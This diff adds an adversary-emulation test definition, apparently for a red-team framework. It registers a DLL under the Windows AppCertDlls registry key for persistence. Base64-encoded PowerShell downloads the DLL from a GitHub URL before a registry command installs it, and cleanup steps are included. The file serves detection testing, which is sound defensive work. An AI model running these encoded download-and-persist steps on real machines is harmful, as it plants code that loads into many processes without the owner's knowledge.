@@ -1,0 +1,24 @@
+- id: caa1a422-03bf-53eb-927a-60774a253650
+  name: Soumaia ART Tests - Create registry persistence via AppCert DLL
+  description: "Creates a new 'AtomicTest' value pointing to an AppCert DLL in the AppCertDlls registry key. \nOnce the computer restarted, the DLL will be loaded in multiple processes and write an \n'AtomicTest.txt' file in C:\\Users\\Public\\ to validate that the DLL executed succesfully.\n\nReference: https://skanthak.homepage.t-online.de/appcert.html (requires elevation)"
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1546.009
+    name: 'Event Triggered Execution: AppCert DLLs'
+  platforms:
+    windows:
+      psh:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAEEAdABvAG0AaQBjAFQAZQBzAHQALgBkAGwAbAAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA
+          if ($LASTEXITCODE -ne 0) {
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABBAHQAbwBtAGkAYwBUAGUAcwB0AC4AZABsAGwAIgApACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABpAGcAbgBvAHIAZQAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AcgBlAGQAYwBhAG4AYQByAHkAYwBvAC8AYQB0AG8AbQBpAGMALQByAGUAZAAtAHQAZQBhAG0ALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AYQB0AG8AbQBpAGMAcwAvAFQAMQA1ADQANgAuADAAMAA5AC8AYgBpAG4ALwBBAHQAbwBtAGkAYwBUAGUAcwB0AC4AZABsAGwAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIALgBcAEEAdABvAG0AaQBjAFQAZQBzAHQALgBkAGwAbAAiAAoA
+          }
+          Copy-Item ".\AtomicTest.dll" C:\Users\Public\AtomicTest.dll -Force
+          reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\AppCertDlls" /v "AtomicTest" /t REG_EXPAND_SZ /d "C:\Users\Public\AtomicTest.dll" /f
+          if($false){Restart-Computer}
+        cleanup: |-
+          reg delete "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\AppCertDlls" /v "AtomicTest" /f
+          Remove-Item C:\Users\Public\AtomicTest.dll -Force
+          Remove-Item C:\Users\Public\AtomicTest.txt -Force
+        payloads:
+        - AtomicTest.dll
